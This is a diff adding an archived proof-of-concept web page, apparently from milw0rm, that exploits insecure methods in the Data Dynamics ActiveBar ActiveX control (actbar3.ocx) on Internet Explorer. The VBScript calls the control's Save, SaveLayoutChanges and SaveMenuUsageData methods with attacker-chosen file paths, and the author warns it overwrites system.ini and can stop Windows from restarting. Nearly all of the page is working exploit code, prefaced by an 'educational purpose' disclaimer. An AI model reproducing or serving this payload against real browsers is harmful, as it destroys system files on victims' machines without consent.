@@ -1,0 +1,57 @@
+<pre>
+<code><span style="font: 10pt Courier New;"><span class="general1-symbol">---------------------------------------------------------------------------------------
+ <b>Data Dynamics ActiveBar ActiveX Control (actbar3.ocx <= 3.1) Multiple Inscure Methods</b>
+ url: http://www.datadynamics.com/default.aspx
+
+ author: shinnai
+ mail: shinnai[at]autistici[dot]org
+ site: http://shinnai.altervista.org
+ 
+ This was written for educational purpose. Use it at your own risk.
+ Author will be not be responsible for any damage.
+ 
+ <b><font color="#FF0000">THE EXPLOIT WILL OWERWRITE THE system.ini FILE SO BE SURE TO MAKE A COPY OF
+ IT BEFORE RUN THIS EXPLOIT OR YOUR PC WILL NOT RESTART!</font></b>
+
+ Tested on Windows XP Professional SP2 all patched, with Internet Explorer 7
+ all software that use this ocx are vulnerable to this exploits.
+
+ <b>This control is marked as:
+ RegKey Safe for Script: True
+ RegKey Safe for Init: True
+ Implements IObjectSafety: False
+ KillBitSet: False</b>
+---------------------------------------------------------------------------------------
+
+<object classid='clsid:5407153D-022F-4CD2-8BFF-465569BC5DB8' id='test'></object>
+
+<select style="width: 404px" name="Pucca">
+  <option value = "Save">Save</option>
+  <option value = "SaveLayoutChanges">SaveLayoutChanges</option>
+  <option value = "SaveMenuUsageData">SaveMenuUsageData</option>
+</select>
+
+<input language=VBScript onclick=tryMe() type=button value="Click here to start the test">
+
+<script language='vbscript'>
+ Sub tryMe
+  on error resume next
+   Dim MyMsg
+   if Pucca.value = "Save" then
+    test.Save "", "c:\carlo1.txt", 1
+    MyMsg = MsgBox("Ok, now check your system.ini file")
+   elseif Pucca.value = "SaveLayoutChanges" then
+    test.SaveLayoutChanges "c:\carlo2.txt", 1
+    MyMsg = MsgBox("Ok, now check your system.ini file")
+   elseif Pucca.value = "SaveMenuUsageData" then
+    test.SaveMenuUsageData "c:\carlo3.txt", 1
+    MyMsg = MsgBox("Ok, now check your system.ini file")
+   end if
+
+ End Sub
+</script>
+
+</span></span>
+</code></pre>
+
+# milw0rm.com [2007-07-17]
